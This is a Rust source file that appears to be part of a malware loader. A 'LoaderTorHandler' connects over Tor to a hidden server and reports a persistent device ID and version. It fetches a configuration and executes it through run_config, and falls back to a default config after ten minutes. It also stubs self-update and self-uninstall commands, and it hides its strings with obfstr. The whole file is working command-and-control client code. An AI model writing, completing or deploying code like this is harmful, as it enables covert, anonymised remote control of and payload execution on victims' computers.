use std::{ sync::{ Arc, Mutex, RwLock }, time::Duration };
use anyhow::{ Context, Result };
use loader_vars::{
    constants::loader_version,
    types::{
        receive::{ self, ClientParams, LoaderReceivePayload, RunConfigParams },
        send::{ GetConfigParams, LoaderSendPayload, ServerAction, ServerParams },
    },
};
use shared::network::tor::{ LoggerConfig, MutexPtr, RwPtr, ServerReceiveType, TorHandler };
use obfstr::obfstr as s;
use super::utils::run_config;

#[derive(Clone)]
pub struct LoaderTorHandler {
    tor_handler: TorHandler,
    config_executed: MutexPtr<bool>,
}

impl LoaderTorHandler {
    pub async fn new(logger_config: LoggerConfig) -> Result<Self> {
        let tor_handler = TorHandler::new(logger_config).await?;
        let config_executed = Arc::new(Mutex::new(false));
        Ok(LoaderTorHandler { tor_handler, config_executed })
    }

    pub async fn run_handler(&mut self) {
        let self_clone = Arc::new(RwLock::new(self.clone()));
        let self_clone2 = self_clone.clone();

        let self_clone3 = self_clone.clone();

        std::thread::spawn(move || {
            std::thread::sleep(Duration::from_secs(60 * 10));
            let binding = self_clone3.write().unwrap();
            let mut run_config_done = binding.config_executed.lock().unwrap();
            if !*run_config_done {
                run_config(RunConfigParams::default()).unwrap();
                *run_config_done = true;
            }
        });

        self.tor_handler.run(
            move || {
                Self::connect_callback_init(self_clone.clone());
            },
            move |handler, data| { Self::process_data(handler.clone(), data, self_clone2.clone()) }
        ).await;
    }
    pub fn connect_callback_init(self_ref: RwPtr<Self>) {
        let params = GetConfigParams {};
        if
            let Err(_error) = Self::send_data(
                &self_ref.read().unwrap().tor_handler,
                ServerAction::GetConfig,
                ServerParams::GetConfig(params)
            )
        {
            // err
        }
    }

    fn process_data(
        tor_handler: TorHandler,
        binary_data: Vec<u8>,
        self_ref: RwPtr<Self>
    ) -> Result<()> {
        let processed_data: LoaderReceivePayload = serde_json
            ::from_slice(&binary_data)
            .context(s!("Failed to parse binary data as LoaderReceivePayload").to_string())?;

        Self::route_data(tor_handler, processed_data, self_ref)
    }

    fn route_data(
        _tor_handler: TorHandler,
        processed_data: LoaderReceivePayload,
        self_ref: RwPtr<Self>
    ) -> Result<()> {
        match processed_data.action {
            receive::ClientAction::RunConfig => {
                if let ClientParams::RunConfig(params) = processed_data.params {
                    if let Ok(()) = run_config(params) {
                        let binding = self_ref.write().unwrap();
                        let mut run_config_done = binding.config_executed.lock().unwrap();
                        *run_config_done = true;
                    }
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClientAction::UninstallSelf => {}
            receive::ClientAction::UpdateSelf => {}
        }
        Ok(())
    }
    fn send_data(
        tor_handler: &TorHandler,
        action: ServerAction,
        params: ServerParams
    ) -> Result<()> {
        let payload = LoaderSendPayload {
            id: tor_handler.constant_device_id.read().unwrap().to_owned(),
            version: loader_version(),
            action,
            params,
        };

        let binary_data = serde_json
            ::to_vec(&payload)
            .context(s!("Failed to serialize ServerReceive struct to binary data").to_string())?;

        tor_handler.add_to_send_queue(ServerReceiveType::Loader, binary_data)
    }
}
